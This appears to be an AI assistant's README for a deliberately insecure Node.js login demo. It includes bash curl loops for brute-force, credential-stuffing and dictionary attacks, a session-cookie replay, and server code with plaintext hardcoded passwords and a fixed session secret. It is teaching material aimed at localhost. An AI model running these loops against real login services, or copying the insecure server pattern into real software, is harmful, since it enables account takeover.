Here is a **complete, professional README.md** file for your broken authentication demonstration project. It includes setup instructions for both **frontend (React)** and **backend (Node.js)**, attack demonstration steps, and security explanations.

```markdown
# 🔐 Broken Authentication Demo Project

A hands-on demonstration of common authentication vulnerabilities:
- Brute Force
- Credential Stuffing
- Dictionary Attack
- Session Hijacking

> ⚠️ **Warning**: This project is intentionally insecure for educational purposes only. Do not use in production.

---

## 📦 Project Structure

```
CSDF/
├── frontend/           # React login interface
├── backend/            # Node.js + Express server
├── combolist.txt       # Username/password pairs for credential stuffing
├── passwords.txt       # Common passwords for dictionary attack
├── usernames.txt       # Common usernames for dictionary attack
└── README.md           # This file
```

---

## 🛠️ Setup Instructions

### 1. Start the Backend

```
cd backend
npm install express cors express-session
node server.js
```

> Server runs on `http://localhost:4000`

### 2. Start the Frontend (Optional)

```
cd frontend
npm install
npm start
```

> React app runs on `http://localhost:3000`

---

## 🔥 Attack Demonstrations

### 1. Brute Force Attack
Try common passwords against `admin`:

```
for pwd in admin password 123456 qwerty letmein welcome admin123; do
  echo "Testing password: $pwd"
  response=$(curl -s -w "%{http_code}" \
    -H "Content-Type: application/json" \
    -d "{\"username\": \"admin\", \"password\": \"$pwd\"}" \
    http://localhost:4000/login)
  body="${response::-3}"
  status="${response: -3}"
  echo "Status: $status"
  echo "Response: $body"
  echo "---"
done
```

✅ Success: `admin:admin123`

---

### 2. Credential Stuffing Attack
Test known username/password pairs:

```
echo -e "admin:admin123\n122:123" > combolist.txt

while IFS=: read user pass; do
  curl -X POST \
    -H "Content-Type: application/json" \
    -d "{\"username\": \"$user\", \"password\": \"$pass\"}" \
    http://localhost:4000/login
  echo ""
done < combolist.txt
```

✅ Success: Both pairs work.

---

### 3. Dictionary Attack
Try all username/password combinations:

```
echo -e "admin\npassword\n123456\nqwerty\nletmein\nwelcome\n122\n123" > passwords.txt
echo -e "admin\n122" > usernames.txt

while read user; do
  while read pwd; do
    clean_user=$(echo "$user" | tr -d '\r')
    clean_pwd=$(echo "$pwd" | tr -d '\r')
    response=$(curl -s -w "%{http_code}" \
      -H "Content-Type: application/json" \
      -d "{\"username\": \"$clean_user\", \"password\": \"$clean_pwd\"}" \
      http://localhost:4000/login)
    body="${response::-3}"
    status="${response: -3}"
    if [[ "$status" == "200" && "$body" == *'"success":true'* ]]; then
      echo "SUCCESS: $clean_user:$clean_pwd"
      echo "Response: $body"
      echo "Status: $status"
      echo "---"
    fi
  done < passwords.txt
done < usernames.txt
```

✅ Success: `admin:admin123`, `122:123`

---

### 4. Session Hijacking
Steal and reuse a session cookie:

1. Log in via frontend to get a valid session.
2. Copy `connect.sid` from browser dev tools.
3. Use it in `curl`:

```
curl -H "Cookie: connect.sid=s%3A29plYv8iA4K2NTWjIFLEhOu_dFqxulYb.4MytMAHvitFB%2BiFBUFj8RtlZ4IA8QypEPn%2FpTNJPa0A" \
  http://localhost:4000/profile
```

✅ Output:
```
{"loggedIn":true,"user":{"username":"admin"}}
```

---

## 🛡️ Vulnerabilities Demonstrated

| Attack | Vulnerability |
|-------|---------------|
| Brute Force | No rate limiting, weak password |
| Credential Stuffing | Password reuse, no MFA |
| Dictionary Attack | Predictable credentials |
| Session Hijacking | Insecure session cookies |

---

## 🛠️ Backend Code (`backend/server.js`)

```
const express = require('express');
const cors = require('cors');
const session = require('express-session');

const app = express();

app.use(cors({
  origin: 'http://localhost:3000',
  credentials: true
}));

app.use(express.json());

// 🔥 Insecure hardcoded users
const users = [
  { username: 'admin', password: 'admin123' },
  { username: '122', password: '123' }
];

app.use(session({
  secret: 'demo_insecure_secret',
  resave: false,
  saveUninitialized: true,
  cookie: { maxAge: 86400000 } // 1 day
}));

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const user = users.find(u => u.username === username && u.password === password);
  if (user) {
    req.session.user = { username: user.username }; // Minimal session
    res.json({ success: true, message: "Login successful" });
  } else {
    res.status(401).json({ success: false, message: "Invalid credentials" });
  }
});

app.get('/profile', (req, res) => {
  if (req.session.user) {
    res.json({ loggedIn: true, user: req.session.user });
  } else {
    res.status(401).json({ loggedIn: false });
  }
});

app.listen(4000, () => {
  console.log('Insecure Demo Server running on port 4000');
});
```

---

## 🧠 Educational Notes

- This project shows how **real attackers exploit weak authentication**.
- Always implement:
  - Strong password policies
  - Rate limiting
  - MFA
  - Secure session management (`HttpOnly`, `SameSite`, short expiry)
- Use tools like `express-rate-limit` and `bcrypt` in real apps.

---

## 📚 References
- OWASP Top 10: Broken Authentication
- NIST Password Guidelines
- MITRE ATT&CK: T1110 (Brute Force)

> Created for educational use in security awareness and ethical hacking demonstrations.
```

***

### ✅ How to Use This README

1. Save as `README.md` in your project root.
2. Share with instructors or peers.
3. Use during presentations to explain each attack and vulnerability.

